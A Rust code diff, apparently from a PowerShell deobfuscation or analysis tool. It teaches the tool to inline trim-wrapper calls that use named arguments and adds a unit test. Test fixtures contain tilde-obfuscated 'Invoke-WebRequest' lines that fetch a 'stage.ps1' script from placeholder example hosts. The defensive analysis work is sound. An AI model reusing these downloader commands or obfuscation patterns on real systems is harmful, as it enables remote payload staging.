@@ -3337,7 +3337,8 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
         let Some(value_idx) = param_index.get(&value_var.to_ascii_lowercase()).copied() else {
             continue;
         };
-        let chars_idx = match caps.get(3).map(|m| m.as_str()) {
+        let chars_var = caps.get(3).map(|m| m.as_str());
+        let chars_idx = match chars_var {
             Some(chars_var) => match param_index.get(&chars_var.to_ascii_lowercase()).copied() {
                 Some(idx) => Some(idx),
                 None => continue,
@@ -3345,7 +3346,9 @@ fn expand_literal_trim_extractor_calls(text: &str) -> String {
             None => None,
         };
 
-        out = inline_ps_literal_trim_calls(&out, &name, value_idx, chars_idx, kind);
+        out = inline_ps_literal_trim_calls(
+            &out, &name, value_idx, value_var, chars_idx, chars_var, kind,
+        );
     }
     out
 }
@@ -3696,7 +3699,9 @@ fn inline_ps_literal_trim_calls(
     text: &str,
     name: &str,
     value_idx: usize,
+    value_name: &str,
     chars_idx: Option<usize>,
+    chars_name: Option<&str>,
     kind: PsTrimKind,
 ) -> String {
     let lower = text.to_ascii_lowercase();
@@ -3723,6 +3728,21 @@ fn inline_ps_literal_trim_calls(
         let parenthesized = bytes.get(pos) == Some(&b'(');
         if parenthesized {
             pos = skip_ascii_ws(bytes, pos + 1);
+        }
+        if bytes.get(pos) == Some(&b'-') {
+            if let Some((call_end, replacement)) = inline_ps_named_literal_trim_call(
+                text,
+                pos,
+                parenthesized,
+                value_name,
+                chars_name,
+                kind,
+            ) {
+                matches.push((call_start, call_end, replacement));
+                search_from = call_end;
+                match_count += 1;
+                continue;
+            }
         }
         let Some((first_end, first)) = parse_ps_static_quoted_literal(text, pos) else {
             search_from = end_name;
@@ -3799,6 +3819,97 @@ fn inline_ps_literal_trim_calls(
         out.replace_range(start..end, &replacement);
     }
     out
+}
+
+fn inline_ps_named_literal_trim_call(
+    text: &str,
+    pos: usize,
+    parenthesized: bool,
+    value_name: &str,
+    chars_name: Option<&str>,
+    kind: PsTrimKind,
+) -> Option<(usize, String)> {
+    let (call_end, args) = parse_ps_named_static_literal_args(text, pos, parenthesized, 4)?;
+    let value = args
+        .iter()
+        .find(|(name, _)| name.eq_ignore_ascii_case(value_name))?
+        .1
+        .as_str();
+    if value.len() > 8192 {
+        return None;
+    }
+
+    let trimmed = if let Some(chars_name) = chars_name {
+        let chars = args
+            .iter()
+            .find(|(name, _)| name.eq_ignore_ascii_case(chars_name))?
+            .1
+            .as_str();
+        if chars.is_empty() {
+            return None;
+        }
+        kind.apply_chars(value, chars)
+    } else {
+        kind.apply_default(value)
+    };
+    if trimmed.len() > 8192 {
+        return None;
+    }
+    Some((call_end, format!("'{}'", trimmed.replace('\'', "''"))))
+}
+
+fn parse_ps_named_static_literal_args(
+    text: &str,
+    mut pos: usize,
+    parenthesized: bool,
+    max_args: usize,
+) -> Option<(usize, Vec<(String, String)>)> {
+    let bytes = text.as_bytes();
+    let mut args = Vec::new();
+    let mut arg_end = pos;
+    for _ in 0..max_args {
+        pos = skip_ascii_ws(bytes, pos);
+        if parenthesized && bytes.get(pos) == Some(&b')') {
+            return (!args.is_empty()).then_some((pos + 1, args));
+        }
+        if bytes.get(pos) != Some(&b'-') {
+            break;
+        }
+        let name_start = pos + 1;
+        let mut name_end = name_start;
+        while name_end < bytes.len()
+            && (bytes[name_end].is_ascii_alphanumeric() || bytes[name_end] == b'_')
+        {
+            name_end += 1;
+        }
+        if name_end == name_start {
+            return None;
+        }
+        let name = text[name_start..name_end].to_ascii_lowercase();
+        pos = skip_ascii_ws(bytes, name_end);
+        let (value_end, value) = parse_ps_static_quoted_literal(text, pos)?;
+        args.push((name, value));
+        arg_end = value_end;
+        pos = value_end;
+
+        if parenthesized {
+            let next = skip_ascii_ws(bytes, pos);
+            if bytes.get(next) == Some(&b',') {
+                pos = next + 1;
+                continue;
+            }
+            if bytes.get(next) == Some(&b')') {
+                return Some((next + 1, args));
+            }
+            pos = next;
+        }
+    }
+
+    if parenthesized {
+        None
+    } else {
+        (!args.is_empty()).then_some((arg_end, args))
+    }
 }
 
 #[derive(Clone, Copy)]
@@ -6629,6 +6740,23 @@ Clean '~~~Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1~~~'
         assert!(
             out.contains("'Invoke-WebRequest -Uri https://ps-trim-extractor.example/stage.ps1'"),
             "trim extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_trim_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Clean($value,$chars) {
+  return $value.Trim($chars)
+}
+Clean -chars '~' -value '~~~Invoke-WebRequest -Uri https://ps-trim-named-args-extractor.example/stage.ps1~~~'"#;
+
+        let out = expand_literal_trim_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-trim-named-args-extractor.example/stage.ps1'"
+            ),
+            "named-argument trim extractor call was not rewritten:\n{out}"
         );
     }
 
